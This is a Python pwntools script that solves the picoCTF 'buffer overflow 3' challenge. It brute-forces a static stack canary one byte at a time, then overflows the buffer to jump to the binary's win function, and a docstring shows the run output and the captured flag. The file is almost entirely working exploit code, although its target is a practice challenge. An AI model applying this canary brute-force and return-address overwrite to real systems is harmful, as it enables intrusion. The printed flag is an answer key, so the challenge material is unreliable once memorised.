#!/usr/bin/env python3

'''
$ ./buffer_overflow_3.py remote
[+] Found canary byte: b'B'
[+] Found canary byte: b'Bi'
[+] Found canary byte: b'BiR'
[+] Found canary byte: b'BiRd'
Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_32625866}
'''

from sys import argv
from pwn import *

context.log_level = 'error'

BIN = './buffer_overflow_3.bin'

IP = 'saturn.picoctf.net'
PORT = 57177

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


def find_canary(offset: int, size: int) -> bytes:
    canary_bytes = b'BiR'
    for i in range(3, size):
        found = False
        for c in range(256):
            # generate payload
            buff = b'A' * 64
            canary = canary_bytes + p8(c)
            payload = buff + canary

            # send payload
            p = open_instance()
            p.readuntil(b'> ')
            p.sendline(str(len(payload)).encode())
            p.readuntil(b'Input> ')
            p.sendline(payload)

            if b'***** Stack Smashing Detected *****' not in p.recvall():
                canary_bytes += p8(c)
                found = True
                print(f'[+] Found canary byte: {canary}')
                break
        if not found:
            print(f'[-] Failed to find canary byte at {i}')
            exit(1)
    return canary_bytes


# generate payload
buff = b'A' * 64
canary = find_canary(64, 4)
padding = b'A' * 16
win_addr = elf.symbols['win']
payload = buff + canary + padding + p64(win_addr)

# send payload
p = open_instance()

p.readuntil(b'> ')
p.sendline(b'1000')
p.readuntil(b'Input> ')
p.sendline(payload)

# read flag
flag = p.recvall().strip()
print(flag.decode())
